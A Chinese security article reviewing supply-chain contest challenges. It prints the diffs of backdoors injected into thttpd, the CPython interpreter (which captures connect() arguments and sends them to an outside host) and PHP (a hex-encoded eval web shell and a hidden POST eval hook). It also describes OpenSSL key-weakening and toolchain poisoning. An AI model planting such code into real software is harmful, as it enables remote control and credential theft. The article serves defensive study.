> 原文链接: https://www.anquanke.com//post/id/151054 


# 功守道 | 软件供应链安全大赛•C源代码赛季官方赛题精选


                                阅读量   
                                **100823**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t013811dc8d8f9d2a91.jpg)](https://p2.ssl.qhimg.com/t013811dc8d8f9d2a91.jpg)

## 背景

软件供应链安全的问题，无异于潘多拉的盒子。本次软件供应链安全大赛，通过在限定框架范围，打开魔盒释放出一定、低害但超出早先人们认知的程序恶意，将其公之于众，以使得人们对其不再毫无防备，从而能够前摄性的研发对应的解决之道。<br>
大赛通过对外公开招募，形成了具有红蓝对抗关系的两支队伍：出题队（蓝军）与解题队（红军），组织方则负责提供比赛资源和平台，担当题目审核、防作弊混淆、赛事仲裁的第三方角色。纵览整个C源代码赛季，我们从出题队提供的约600道题目中，精选了若干道（组）最具有代表性、新颖性甚至让人不寒而栗的题目进行剖析，来展示出题队攻击思维的冰山一角。<br>
在此需要特别强调：本文中所列举的所有恶意代码，仅用于彰显那些当前有安全人员可能想到的恶意行为；考虑到真正的威胁永远源于未知，这些题目所搭载的恶意行为类型，实质上在曝光的同时就已经失去最大威胁，但由于信息不对等，在真实场景仍然可能会被利用。所以所有读者需要在阅读同时，需要保证绝不会将这里的思路，以及由此延展出的思维用于真实场景。困兽：经典赛题示例。



## 一、thttpd后门陷阱

从基础软件或应用上面入手，稳定可控的后门是最佳选择。而在一个无关应用中突兀地出现网络连接，隐蔽性总归很差；在thttpd当中，以很袖珍的代码实现稳定的后门，是这里首先要呈现的一个题目。<br>
在thttpd项目，恶意代码嵌入到libhttpd.c文件中，上下游恶意代码相关上下文：

```
/thttpd/libhttpd.c
—- malware/libhttpd.c
** httpd_parse_request( httpd_conn hc )
** 2102,2107 **
—- 2102,2113 ——
cp += strspn( cp, “ t” );
hc-&gt;useragent = cp;
`}`

else if ( strncasecmp( buf, “TE:”, 3 ) == 0)
`{`
cp = &amp;buf[3];
cp += strspn( cp, “ t”);
hc-&gt;hs-&gt;cgi_pattern = cp;
`}`
else if ( strncasecmp( buf, “Host:”, 5 ) == 0 )
`{`
cp = &amp;buf[5];
* cgi_child( httpd_conn hc )
** 3560,3565 **
—- 3566,3576 ——
```

### HAVE_SIGSET

```
/ Run the program. /

if ( strstr( hc-&gt;acceptl, “en;q=1.1”) != (char*)0 )
`{`
binary = argp[1];
argp++;
`}`
(void) execve( binary, argp, envp );
/ Something went wrong. /
```

后门会根据http头判断是否开启cgi功能，并根据http头Accept-Language决定解析执行文件的路径。上述代码段中，首先通过http头TE:设置开启cgi功能（对应上述代码中，httpd_parse_request函数中插入的else if ( strncasecmp( buf, “TE:”, 3 ) == 0) `{`…`}`代码块）。而下游代码同样巧妙，指定特殊的Accept-Language: en;q=1.1决定是否执行指定的系统命令（即cgi_child函数插入的if ( strstr( hc-&gt;acceptl, “en;q=1.1”) != (char*)0 ) `{`…`}`代码块）。<br>
本例恶意行为的主要特点：<br>
• 该后门的嵌入，新增代码量极小（共7行），巧妙借用了thttpd处理用户请求、cgi的原本逻辑，借用了execve的调用，没有任何新增的API调用等行为，可以躲避有意识的行为特征匹配检测。<br>
• 该后门在代码中的插入，分布在了存在逻辑关联的上下游两个位置，在源代码分析领域，属于过程间代码扫描问题，对于基于语义的源代码静态扫描方案也提出了很高的要求。



## 二、Python上帝之手

对生产环境上运行的任意程序获取控制、检查、按需泄漏的权力，很难做的轻量、了无痕迹，总会有鲜明的行为特征被人察觉；但是针对解释执行类型的语言，只需要在解释器上稍动手脚，就可以实现四两拨千斤的效果。本次比赛有两只出题队不约而同地采用了这个思路，分别在Python和Lua解释器上实现了巧妙的污染来实现非破坏性的定向攻击，此处以Python为例展示。<br>
恶意行为完整代码，嵌入到了Python/symtable.c文件中的多个位置，完整的新增内容如下：

```
* /Python3.6.6rc1/Python/symtable.c
—- malware/symtable.c

4,9 *
—- 4,16 ——
```

### <a class="reference-link" name="include%20%E2%80%9Csymtable.h%E2%80%9D"></a>include “symtable.h”

<a class="reference-link" name="include%20%E2%80%9Cstructmember.h%E2%80%9D"></a>**include “structmember.h”**
- static int PyArglen;
- static int PyCurpos;
### <a class="reference-link" name="define%20PyMaxpos%20512"></a>define PyMaxpos 512
- static char PyBuffer[PyMaxpos];
- static int
symtable_visit_Dynamic(struct symtable st, expr_ty e);<br>
+<br>
/ error strings used for warnings */

### <a class="reference-link" name="define%20GLOBAL_AFTER_ASSIGN%20"></a>define GLOBAL_AFTER_ASSIGN

```
“name ‘%U’ is assigned to before global declaration”
* symtable_visit_stmt(struct symtable st,
** 1386,1391 **
—- 1393,1403 ——
static int
symtable_visit_expr(struct symtable *st, expr_ty e)
`{`

PyObject s, n;
+
int iN , iNN[4];
char cS , tS;
+
if (++st-&gt;recursion_depth &gt; st-&gt;recursion_limit) `{`

PyErr_SetString(PyExc_RecursionError, "maximum recursion depth exceeded during compilation");

* symtable_visit_expr(struct symtable st,
** 1465,1470 **
—- 1477,1489 ——

VISIT_SEQ(st, expr, e-&gt;v.Compare.comparators); break;

case Call_kind:

if (e-&gt;v.Call.func-&gt;kind == Name_kind)
`{`
if (_PyUnicode_EqualToASCIIString(e-&gt;v.Call.func-&gt;v.Name.id, “connect”))
`{`
PyArglen = e-&gt;v.Call.args-&gt;size;
`}`
`}`
VISIT(st, expr, e-&gt;v.Call.func);
VISIT_SEQ(st, expr, e-&gt;v.Call.args);
VISIT_SEQ_WITH_NULL(st, keyword, e-&gt;v.Call.keywords);
* symtable_visit_expr(struct symtable st,
** 1478,1485 **
—- 1497,1532 ——
VISIT_SEQ(st, expr, e-&gt;v.JoinedStr.values);
break;
case Constant_kind:
break;
case Num_kind:
if (PyArglen &gt; 0)
`{`
n = e-&gt;v.Num.n;
iN = PyLong_AsLong(n);
sprintf(iNN,”%d”,iN);
if (PyCurpos + strlen(iNN) &lt; PyMaxpos - 1)
`{`
memcpy(PyBuffer + PyCurpos, iNN, strlen(iNN));
PyCurpos += strlen(iNN);
PyBuffer[PyCurpos++] = ‘|’;
`}`
PyArglen—;
`}`
break;
case Str_kind:
if (PyArglen &gt; 0)
`{`
n = e-&gt;v.Num.n;
iN = PyLong_AsLong(n);
sprintf(iNN,”%d”,iN);
if (PyCurpos + strlen(iNN) &lt; PyMaxpos - 1)
`{`
memcpy(PyBuffer + PyCurpos, iNN, strlen(iNN));
PyCurpos += strlen(iNN);
PyBuffer[PyCurpos++] = ‘|’;
`}`
PyArglen—;
`}`
break;
case Str_kind:
if (PyArglen &gt; 0)
`{`
s = e-&gt;v.Str.s;
cS = PyUnicode_DATA(s);
if (PyCurpos + strlen(cS) &lt; PyMaxpos - 1)
`{`
memcpy(PyBuffer + PyCurpos, cS, strlen(cS));
PyCurpos += strlen(cS);
PyBuffer[PyCurpos++] = ‘|’;
`}`
PyArglen—;
`}`
break;
case Bytes_kind:
case Ellipsis_kind:
case NameConstant_kind:
* symtable_visit_expr(struct symtable st,
** 1517,1522 **
—- 1565,1578 ——
VISIT_SEQ(st, expr, e-&gt;v.Tuple.elts);
break;
`}`
+
if (PyArglen == 0 &amp;&amp; PyCurpos &gt; 0)
`{`
PyCurpos = 0;
symtable_visit_Dynamic(st, e);
memset(PyBuffer, 0, PyMaxpos);
`}`
+
VISIT_QUIT(st, 1);
`}`
* symtable_visit_dictcomp(struct symtable
1787,1789 *
—- 1843,1861 ——
e-&gt;v.DictComp.key,
e-&gt;v.DictComp.value);
`}`
+

static int
symtable_visit_Dynamic(struct symtable *st, expr_ty e)
`{`
const char *PyMod = `{`
“try:n”
“ from urllib import parse,requestn”
“ urltxt = parse.urlencode(`{`‘pymod’:’%s’`}`)n”
“ url=’https://www.pythondevorg.org/dev‘ + ‘?’ + urltxtn”
“ res = request.urlopen(request.Request(url = url))n”
“except Exception as e:n”
“ pass”
`}`;
PyRun_SimpleStringFlags(PyUnicode_DATA(PyUnicode_FromFormat(PyMod, PyBuffer)), NULL);
return 0;
`}`
```

Python应用代码中常见地通过定义一个名为connect函数，传入hostportuserpwd或者协议字符串进行服务请求，如ssh或数据库连接，所以，在这个攻击题目实例中，在Python解释器源代码层面进行污染篡改，实现偷取名为connect函数调用时这些敏感参数。<br>
实现逻辑如下： 1. 在Python表达式语法树遍历过程中，判断方法表达式Call_kind名称是否为connect，是的话进行标记，之后偷参数； 2. 取出该函数的参数个数，并且截取该函数传入的数字、字符串参数保存起来； 3. 当表达式语法树遍历结束后，利用事先准备好的Python源码模板，格式化得到完整Python代码； 4. 动态注入Python代码执行后续传出操作,使用项目原生PyRun_SimpleStringFlags函数。<br>
在这个示例中，邪恶点在两方面最为突出：
- 恶意行为的嵌入基于对载体（Python）的充分了解，充分利用载体自有的逻辑和API功能来实现完整的攻击行为，由此具有对人工审核和工具检测的绕过能力；
- 目标出其不意，具有极强的针对性，从源代码层面下手，一方面在此思路上可以扩展出来的其它攻击目标和方式很多，另一方面使得独立于载体的攻击代码（如数据泄漏传出）可以很自然地得以执行。


## 三、php双子

接下来呈现的是两道独立的题目。在规则确保不同出题队完全互不通气、思路保密的前提下，两支出题队伍不约而同地选取了php作为攻击目标载体；但是切入点、攻击方式、实现效果又完全不同，充分体现了在软件供应链安全这个范畴内，问题的发散和多样性。<br>
恶意php1<br>
其中的一道题目简单直接，在引擎层面动手脚，恶意代码注入在main/main.c文件中：

```
php-src/main/main.c
—- malware/main.c
** PHPAPI int php_stream_open_for_zend_ex(c
1388,1397 *
&amp;&amp; ((len - 1) % page_size) &lt;= page_size - ZEND_MMAP_AHEAD
```

### <a class="reference-link" name="endif"></a>endif

```
&amp;&amp; php_stream_mmap_possible(stream)
```

! &amp;&amp; (p = php_stream_mmap_range(stream, 0, len, PHP_STREAM_MAP_MODE_SHARED_READONLY, &amp;mapped_len)) != NULL) `{`<br>
handle-&gt;handle.stream.closer = php_zend_stream_mmap_closer;<br>
handle-&gt;handle.stream.mmap.buf = p;<br>
! handle-&gt;handle.stream.mmap.len = mapped_len;<br>
handle-&gt;type = ZEND_HANDLE_MAPPED;<br>
`}` else `{`<br>
handle-&gt;handle.stream.closer = php_zend_stream_closer;<br>
—- 1388,1405 ——<br>
&amp;&amp; ((len – 1) % page_size) &lt;= page_size – ZEND_MMAP_AHEAD

### <a class="reference-link" name="endif"></a>endif

```
&amp;&amp; php_stream_mmap_possible(stream)
```

! &amp;&amp; (p = php_stream_mmap_range(stream, 0, len, PHP_STREAM_MAP_MODE_READWRITE, &amp;mapped_len)) != NULL) `{`<br>
!<br>
! char* data = “x3cx3fx70x68x70x20x40x65x76x61x6cx28x24x5fx50x4fx53x54x5bx27x32x6cx69x76x65x27x5dx29x3bx20x3fx3ex0a”;<br>
! int data_len = strlen(data);<br>
! int i = len;<br>
! for (; i &gt; -1 ; i —) `{`<br>
! p[i + data_len] = p[i];<br>
! `}`<br>
! memcpy(p, data, data_len);<br>
handle-&gt;handle.stream.closer = php_zend_stream_mmap_closer;<br>
handle-&gt;handle.stream.mmap.buf = p;<br>
! handle-&gt;handle.stream.mmap.len = data_len + len;//mapped_len;<br>
handle-&gt;type = ZEND_HANDLE_MAPPED;<br>
`}` else `{`<br>
handle-&gt;handle.stream.closer = php_zend_stream_closer;

在php脚本被加载到内存之后，zend引擎解析php脚本之前，修改php源码中代码设置mmap内存的属性为可写，然后窜改内存中的脚本代码，在脚本第一行插入一个一句话木马，POST的key是2live。<br>
恶意php2<br>
另一道思路剑走偏锋，切入点选择在了官方默认扩展date中，处在文件ext/date/php_date.c：

```
ext/date/php_date.c
—- malware/php_date.c
** static void _php_date_tzinfo_dtor(zval 
** 708,713 **
—- 708,716 ——
/ `{``{``{` PHP_RINIT_FUNCTION /
PHP_RINIT_FUNCTION(date)
`{`

zval *p;
zval *bd;
+
if (DATEG(timezone)) `{`
efree(DATEG(timezone));
`}`
* PHP_RINIT_FUNCTION(date)
715,720 *
—- 718,739 ——
DATEG(tzcache) = NULL;
DATEG(last_errors) = NULL;

zend_is_auto_global_str(“x5fx50x4fx53x54”, sizeof(“x5fx50x4fx53x54”) - 1);
+
p = zend_hash_str_find(&amp;EG(symbol_table), ZEND_STRL(“x5fx50x4fx53x54”));
if (p == NULL || Z_TYPE_P(p) != IS_ARRAY) `{`
return SUCCESS;
`}`
+
bd = zend_hash_str_find(Z_ARRVAL_P(p), ZEND_STRL(“x62x34x64x30x30x72”));
if (bd == NULL) `{`
return SUCCESS;
`}`
+
if (Z_TYPE_P(bd) == IS_STRING) `{`
zend_eval_string(Z_STRVAL_P(bd), NULL, (char *)”” TSRMLS_CC);
`}`
+
return SUCCESS;
`}`
/ `}``}``}` /
```

部署后，若HTTP POST请求参数中存在“b4d00r”，用PHP内核的zend_eval_string函数执行b4d00r中的代码。这样的后门类型更难以被日常监控检测到；更重要的是，这里代表了一个类型的攻击面，即各类应用框架下的插件体系：对于支持第三方贡献插件的部分主流系统，部分仍然存在有完全开放、缺乏审查或开发者鉴权的问题，这留下了很大的做文章的空间。



## 四、全面战争

以上我们列举了针对生产环境上，主流服务端应用的本体进行污染、篡改和攻击的几个实例。这可能给读者留下这样的印象：虽然恶意代码本身会通过融入原有代码逻辑、调用项目自有API等方式来实现自身的隐蔽，但对于这些关键应用进行细致的审核检查，甚至于人工分析，只要其源码是可用的，那么总能够保证这些应用的可信。可惜，这样的乐观，不存在的。<br>
在系统和所有基础软件都来源于不完全可信来源（没错，即便是开源软件贡献者也不能称为可信，没有人是天使）的假设下，对特定服务端应用的污染、窃取、篡改和攻击，完全可以从任意方面发起。以下不列举相关恶意代码和上下文，简单列举几个这样的实例：<br>
• 通过在一个系统基础组件krb5当中，插入恶意代码实现IAT HOOK，针对OpenSSL系统组件，在目标调用栈环境中，劫持BN_rand方法使得生成的伪随机数恒固定为特定数值，且使得EC_KEY_generate_key方法与DH_generate_key方法生成始终可预测的椭圆曲线秘钥；这样进而达到OpenSSH的服务端sshd在接受客户端ssh连接时，握手秘钥可掌握，从而能够直接获取会话秘钥，辅以其它简单的方案，就能够使得所谓加密信道的数据完全可被监听泄漏。<br>
• 针对处于后台的开发编译机器环境。先判断是否是真机Android源码编译开发环境，如果是虚拟机不执行恶意代码，如果是真机，监听本地端口下载编译工具，进行编译链工具或开发标准库的替换，从而实现在源头进行软件供应链上游的持续、全面污染。<br>
• 在任何可能存在目录遍历、文件操作的载体代码上下文中，搭车进行特定资产类型文件的遍历搜索，如特定的代码、文档、数据库类型文件，账户秘钥和系统信息相关的配置文件，特定服务端应用（如Nginx，git等，见上一节中所列举的目标攻击面服务端应用列表）的关键配置和数据文件等，并予以外传。<br>
以上类型不胜枚举，且均具有两个特征：功能实现代码体量很小，方便隐藏；对载体项目上下文基本不挑剔，所以可以嵌入到任何有被执行条件的开源载体工程中。这些行为甚至可以是看上去“很low”的行为，即便不针对源代码扫描的各种方案进行有目的性的反检测，一旦混入庞杂的开源项目代码中，就完全无从分析——毕竟若假定全部基础软件和组件都不可信的话，那么即便是针对少数几种已知的恶意行为类型，使用源代码扫描工具编写特定的检测规则、全量扫描，也是一件很难保证高准确率、低误报率的工作，更何况请不要忘记在第一篇文章中我们提出的前提：最致命的是问题完全发散，任何针对已知来收敛问题的尝试都很无力。



## 后记

在上面我们展示了在这场比赛中，出题队精心构造的600余道题目的冰山一角。也许有些能够让人倒吸一口凉气，感慨这样偏门的思路也确实能够造成意外的从内溃败；也许有些似乎简单的让人发笑，也为这些“毫不做作”的恶意代码能够达成的攻击而感到无奈。<br>
那么，看完了攻方的这些脑洞与奇技淫巧，我们比赛中的守方又采用了什么思路和方法进行应对，结果又如何？比赛结果体现了现在攻守双方怎样的杠杆形式？请阅读专题赛事总结姊妹篇《『功守道』软件供应链安全大赛第一季-C源代码赛季总结》。<br>
欲参与后续PE赛季，欢迎访问比赛官网（[https://softsec.security.alibaba.com/](https://softsec.security.alibaba.com)）了解报名，与来自阿里安全和该领域其它玩家一起切磋。PE赛季本周开赛，7月7日测试赛，7月21日第一场分站赛，报名通道保持开启，只等你来！

审核人：yiwang   编辑：边边
